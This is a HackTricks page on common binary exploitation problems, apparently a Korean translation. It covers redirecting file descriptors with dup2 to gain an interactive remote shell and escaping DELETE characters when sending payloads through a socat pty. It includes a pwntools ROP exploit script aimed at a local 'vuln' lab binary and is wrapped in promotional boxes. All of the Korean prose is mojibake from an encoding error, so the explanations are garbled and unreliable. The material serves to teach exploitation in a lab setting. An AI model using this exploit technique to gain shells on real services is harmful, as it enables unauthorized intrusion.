# ì¼ë°˜ì ì¸ Exploiting ë¬¸ì œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **HackTricksì— ê·€ì‚¬ë¥¼ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì ì ì¸ [**NFT ì»¬ë ‰ì…˜**](https://opensea.io/collection/the-peass-family)
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ë¡œ PRì„ ì œì¶œ**í•˜ì„¸ìš”.

</details>

## ì›ê²© Exploitationì—ì„œì˜ FDs

ì˜ˆë¥¼ ë“¤ì–´ **`system('/bin/sh')`**ë¥¼ í˜¸ì¶œí•˜ëŠ” ì›ê²© ì„œë²„ë¡œ exploitì„ ì „ì†¡í•  ë•Œ, ì´ëŠ” ì„œë²„ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‹¤í–‰ë˜ë©°, `/bin/sh`ëŠ” stdin(FD: `0`)ì—ì„œ ì…ë ¥ì„ ê¸°ëŒ€í•˜ê³  stdout ë° stderr(FDs `1` ë° `2`)ì—ì„œ ì¶œë ¥ì„ ì¶œë ¥í•  ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” ì…¸ê³¼ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ì—†ê²Œ ë©ë‹ˆë‹¤.

ì´ë¥¼ í•´ê²°í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ ì„œë²„ê°€ ì‹œì‘ë  ë•Œ **FD ë²ˆí˜¸ `3`** (ì²­ì·¨ìš©)ë¥¼ ìƒì„±í–ˆë‹¤ê³  ê°€ì •í•˜ê³ , ê·¸ í›„ì— ì—°ê²°ì´ **FD ë²ˆí˜¸ `4`**ì— ìˆì„ ê²ƒì´ë¼ê³  ê°€ì •í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ, **`dup2`** ì‹œìŠ¤í…œ í˜¸ì¶œì„ ì‚¬ìš©í•˜ì—¬ stdin(FD 0)ê³¼ stdout(FD 1)ë¥¼ ê³µê²©ì ì—°ê²°ì˜ FD 4(ì—°ê²°ì˜ FD)ì— ë³µì œí•˜ì—¬ ì‹¤í–‰ëœ í›„ ì…¸ì— ì—°ë½í•  ìˆ˜ ìˆê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì—¬ê¸°ì—ì„œ exploit ì˜ˆì‹œ**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

socatëŠ” ì´ë¯¸ `stdin`ê³¼ `stdout`ë¥¼ ì†Œì¼“ìœ¼ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `pty` ëª¨ë“œì—ëŠ” **DELETE ë¬¸ìê°€ í¬í•¨**ë©ë‹ˆë‹¤. ë”°ë¼ì„œ `\x7f` (`DELETE` -)ë¥¼ ë³´ë‚´ë©´ exploitì˜ ì´ì „ ë¬¸ìê°€ **ì‚­ì œ**ë©ë‹ˆë‹¤.

ì´ë¥¼ ìš°íšŒí•˜ë ¤ë©´ **ì´ìŠ¤ì¼€ì´í”„ ë¬¸ì `\x16`ì„ ë³´ë‚´ë ¤ëŠ” ëª¨ë“  `\x7f` ì•ì— ì¶”ê°€**í•´ì•¼ í•©ë‹ˆë‹¤.

**ì—¬ê¸°ì—ì„œ** [**ì´ ë™ì‘ì˜ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? ê·€í•˜ì˜ íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? ë˜ëŠ” ìµœì‹  ë²„ì „ì˜ PEASSì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”?** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ ë°›ìœ¼ì„¸ìš”
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discord ê·¸ë£¹**ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”**.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì œì¶œí•˜ì„¸ìš”**.

</details>
